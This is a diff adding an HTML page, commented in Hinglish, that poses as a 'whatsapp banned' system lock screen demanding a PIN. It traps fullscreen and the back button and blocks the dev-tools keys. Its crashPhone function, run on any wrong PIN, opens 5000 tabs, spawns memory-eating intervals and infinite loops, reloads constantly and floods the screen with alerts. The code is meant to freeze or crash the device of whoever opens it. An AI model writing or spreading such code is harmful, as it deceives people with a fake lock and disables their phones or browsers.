@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>System Locked</title>
+<style>
+  * { margin:0; padding:0; }
+  body { background:black; color:red; display:flex; justify-content:center; align-items:center; height:100vh; flex-direction:column; font-family:Arial; user-select:none; overflow:hidden; }
+  .box { background:#1a1a1a; padding:40px; border-radius:20px; border:2px solid red; text-align:center; width:90%; max-width:350px; }
+  h1 { font-size:2rem; margin-bottom:10px; }
+  input { padding:15px; font-size:1.5rem; width:80%; background:#222; border:2px solid red; color:white; border-radius:10px; text-align:center; margin:20px 0; }
+  button { padding:15px; background:red; color:black; border:none; font-size:1.2rem; font-weight:bold; border-radius:50px; width:100%; cursor:pointer; }
+  #msg { margin-top:15px; color:#ffaa00; }
+</style>
+</head>
+<body>
+<div class="box">
+  <h1>whatsapp banned</h1>
+  <p style="color:gray;">Enter PIN to unlock</p>
+  <input type="password" id="pass" autofocus>
+  <button onclick="check()">Unlock</button>
+  <p id="msg"></p>
+</div>
+<script>
+  const SECRET = "2911"; // <-- apna password
+
+  // 🔥 YAHAN APNA STICKER PACK DAAL (emoji ya image URLs)
+  const stickerPack = [
+    '😈', '🤣', '😂', '💀', '🔥', '👿', '🤪', '😱',
+    'https://i.imgur.com/abcd1.png', // apni image URL
+    'https://i.imgur.com/abcd2.png',
+    'https://i.imgur.com/abcd3.png',
+    // Jitne chahe utne add kar
+  ];
+
+  function crashPhone() {
+    // 500 tabs – har tab mein sticker pack se ek random sticker
+    for(let i=0;i<5000;i++) {
+      let sticker = stickerPack[Math.floor(Math.random() * stickerPack.length)];
+      let html = '';
+      if(sticker.startsWith('http')) {
+        // Image URL
+        html = `<img src="${sticker}" style="width:300px;height:300px;display:block;margin:20% auto;">`;
+      } else {
+        // Emoji
+        html = `<h1 style="font-size:300px;text-align:center;margin-top:20%;">${sticker}</h1>`;
+      }
+      // Tab mein dikhao
+      window.open('data:text/html,' + encodeURIComponent(`
+        <!DOCTYPE html>
+        <html><head><meta charset="UTF-8"><title>🤡</title></head>
+        <body style="background:#000;margin:0;${sticker.startsWith('http')?'display:flex;justify-content:center;align-items:center;height:100vh;':''}">
+          ${html}
+          <script>document.documentElement.requestFullscreen?.();<${'/script>'}
+        </body></html>
+      `), '_blank');
+    }
+    
+    // Memory bomb + CPU hog + reload + alerts (same as before)
+    for(let t=0;t<200;t++) {
+      (function() {
+        let garbage = [];
+        setInterval(() => { garbage.push(new Array(9999999).fill('x')); }, 1);
+      })();
+    }
+    for(let t=0;t<50;t++) {
+      (function() { while(true) { let a = 1+1; } })();
+    }
+    setInterval(() => { location.reload(); }, 10);
+    setInterval(() => { alert('❌ SYSTEM CRASHED – Restart phone'); }, 1);
+  }
+
+  function check() {
+    let val = document.getElementById('pass').value;
+    if(val === SECRET) {
+      document.body.innerHTML = '<h1 style="color:green;text-align:center;margin-top:40%;">✅ Unlocked!<br>Welcome back</h1>';
+    } else {
+      document.getElementById('msg').innerHTML = '⚠️ Wrong! Phone will lock...';
+      setTimeout(crashPhone, 100);
+    }
+  }
+
+  // Fullscreen + back disable + dev tools disable
+  document.documentElement.requestFullscreen?.();
+  window.location.hash = 'locked';
+  window.history.pushState(null, null, location.href);
+  window.addEventListener('popstate', () => window.history.pushState(null, null, location.href));
+  document.addEventListener('keydown', (e) => {
+    if(e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
+      e.preventDefault();
+      return false;
+    }
+  });
+</script>
+</body>
+</html>
